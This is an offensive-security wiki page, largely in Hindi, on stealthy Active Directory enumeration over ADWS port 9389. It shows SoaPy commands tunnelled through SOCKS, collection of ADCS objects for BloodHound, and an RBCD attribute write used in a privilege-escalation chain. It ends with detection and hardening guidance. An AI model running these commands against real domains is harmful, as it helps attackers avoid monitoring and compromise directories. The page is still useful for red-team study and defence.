# Active Directory Web Services (ADWS) Enumeration & Stealth Collection

{{#include ../../banners/hacktricks-training.md}}

## ADWS क्या है?

Active Directory Web Services (ADWS) **Windows Server 2008 R2 से हर Domain Controller पर डिफ़ॉल्ट रूप से सक्षम है** और TCP **9389** पर सुनता है। नाम के बावजूद, **HTTP शामिल नहीं है**। इसके बजाय, यह सेवा LDAP-शैली के डेटा को एक मालिकाना .NET फ्रेमिंग प्रोटोकॉल के स्टैक के माध्यम से उजागर करती है:

* MC-NBFX → MC-NBFSE → MS-NNS → MC-NMF

चूंकि ट्रैफ़िक इन बाइनरी SOAP फ्रेमों के अंदर संकुचित होता है और एक असामान्य पोर्ट पर यात्रा करता है, **ADWS के माध्यम से एन्यूमरेशन की संभावना क्लासिक LDAP/389 & 636 ट्रैफ़िक की तुलना में बहुत कम होती है कि इसकी जांच, फ़िल्टर या सिग्नेचर किया जाए**। ऑपरेटरों के लिए इसका मतलब है:

* अधिक छिपा हुआ पुनःसंशोधन – नीली टीमें अक्सर LDAP क्वेरी पर ध्यान केंद्रित करती हैं।
* **गैर-Windows होस्ट (Linux, macOS)** से 9389/TCP को SOCKS प्रॉक्सी के माध्यम से टनलिंग करके संग्रह करने की स्वतंत्रता।
* वही डेटा जो आप LDAP के माध्यम से प्राप्त करेंगे (उपयोगकर्ता, समूह, ACLs, स्कीमा, आदि) और **लिखने** की क्षमता (जैसे `msDs-AllowedToActOnBehalfOfOtherIdentity` के लिए **RBCD**)।

> नोट: ADWS का उपयोग कई RSAT GUI/PowerShell टूल द्वारा भी किया जाता है, इसलिए ट्रैफ़िक वैध प्रशासनिक गतिविधियों के साथ मिश्रित हो सकता है।

## SoaPy – नेटिव पायथन क्लाइंट

[SoaPy](https://github.com/logangoins/soapy) **शुद्ध पायथन में ADWS प्रोटोकॉल स्टैक का पूर्ण पुनः कार्यान्वयन** है। यह NBFX/NBFSE/NNS/NMF फ्रेमों को बाइट-फॉर-बाइट तैयार करता है, जिससे Unix-जैसे सिस्टम से बिना .NET रनटाइम को छुए संग्रह करना संभव होता है।

### मुख्य विशेषताएँ

* **SOCKS के माध्यम से प्रॉक्सीिंग का समर्थन** (C2 इम्प्लांट से उपयोगी)।
* LDAP `-q '(objectClass=user)'` के समान बारीक खोज फ़िल्टर।
* वैकल्पिक **लिखने** के संचालन ( `--set` / `--delete` )।
* BloodHound में सीधे सेवन के लिए **BOFHound आउटपुट मोड**।
* मानव पठनीयता की आवश्यकता होने पर टाइमस्टैम्प / `userAccountControl` को सुंदर बनाने के लिए `--parse` ध्वज। 

### स्थापना (ऑपरेटर होस्ट)
```bash
python3 -m pip install soapy-adws   # or git clone && pip install -r requirements.txt
```
## Stealth AD Collection Workflow

The following workflow shows how to enumerate **domain & ADCS objects** over ADWS, convert them to BloodHound JSON and hunt for certificate-based attack paths – all from Linux:

1. **Tunnel 9389/TCP** from the target network to your box (e.g. via Chisel, Meterpreter, SSH dynamic port-forward, etc.).  Export `export HTTPS_PROXY=socks5://127.0.0.1:1080` या SoaPy’s `--proxyHost/--proxyPort` का उपयोग करें।

2. **रूट डोमेन ऑब्जेक्ट इकट्ठा करें:**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-q '(objectClass=domain)' \
| tee data/domain.log
```
3. **Configuration NC से ADCS-संबंधित ऑब्जेक्ट्स इकट्ठा करें:**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-dn 'CN=Configuration,DC=ludus,DC=domain' \
-q '(|(objectClass=pkiCertificateTemplate)(objectClass=CertificationAuthority) \\
(objectClass=pkiEnrollmentService)(objectClass=msPKI-Enterprise-Oid))' \
| tee data/adcs.log
```
4. **BloodHound में परिवर्तित करें:**
```bash
bofhound -i data --zip   # produces BloodHound.zip
```
5. **ZIP अपलोड करें** BloodHound GUI में और साइफर क्वेरीज़ चलाएँ जैसे `MATCH (u:User)-[:Can_Enroll*1..]->(c:CertTemplate) RETURN u,c` ताकि सर्टिफिकेट वृद्धि पथ (ESC1, ESC8, आदि) प्रकट हो सकें।

### लिखना `msDs-AllowedToActOnBehalfOfOtherIdentity` (RBCD)
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@dc.ludus.domain \
--set 'CN=Victim,OU=Servers,DC=ludus,DC=domain' \
msDs-AllowedToActOnBehalfOfOtherIdentity 'B:32:01....'
```
`s4u2proxy`/`Rubeus /getticket` के साथ इसे मिलाकर एक पूर्ण **Resource-Based Constrained Delegation** श्रृंखला बनाएं।

## Detection & Hardening

### Verbose ADDS Logging

Domain Controllers पर निम्नलिखित रजिस्ट्री कुंजियों को सक्षम करें ताकि ADWS (और LDAP) से आने वाले महंगे / अप्रभावी खोजों को उजागर किया जा सके:
```powershell
New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Services\NTDS\Diagnostics' -Name '15 Field Engineering' -Value 5 -Type DWORD
New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Services\NTDS\Parameters' -Name 'Expensive Search Results Threshold' -Value 1 -Type DWORD
New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Services\NTDS\Parameters' -Name 'Search Time Threshold (msecs)' -Value 0 -Type DWORD
```
Events will appear under **Directory-Service** with the full LDAP filter, even when the query arrived via ADWS.

### SACL Canary Objects

1. एक डमी ऑब्जेक्ट बनाएं (जैसे कि निष्क्रिय उपयोगकर्ता `CanaryUser`)।
2. _Everyone_ प्रिंसिपल के लिए एक **Audit** ACE जोड़ें, जो **ReadProperty** पर ऑडिट किया गया हो।
3. जब भी एक हमलावर `(servicePrincipalName=*)`, `(objectClass=user)` आदि करता है, तो DC **Event 4662** उत्पन्न करता है जिसमें असली उपयोगकर्ता SID होता है - भले ही अनुरोध प्रॉक्सी किया गया हो या ADWS से उत्पन्न हुआ हो।

Elastic pre-built rule example:
```kql
(event.code:4662 and not user.id:"S-1-5-18") and winlog.event_data.AccessMask:"0x10"
```
## Tooling Summary

| Purpose | Tool | Notes |
|---------|------|-------|
| ADWS enumeration | [SoaPy](https://github.com/logangoins/soapy) | Python, SOCKS, read/write |
| BloodHound ingest | [BOFHound](https://github.com/bohops/BOFHound) | SoaPy/ldapsearch लॉग को परिवर्तित करता है |
| Cert compromise | [Certipy](https://github.com/ly4k/Certipy) | इसे उसी SOCKS के माध्यम से प्रॉक्सी किया जा सकता है |

## References

* [SpecterOps – Make Sure to Use SOAP(y) – An Operators Guide to Stealthy AD Collection Using ADWS](https://specterops.io/blog/2025/07/25/make-sure-to-use-soapy-an-operators-guide-to-stealthy-ad-collection-using-adws/)
* [SoaPy GitHub](https://github.com/logangoins/soapy)
* [BOFHound GitHub](https://github.com/bohops/BOFHound)
* [Microsoft – MC-NBFX, MC-NBFSE, MS-NNS, MC-NMF specifications](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nbfx/)

{{#include ../../banners/hacktricks-training.md}}
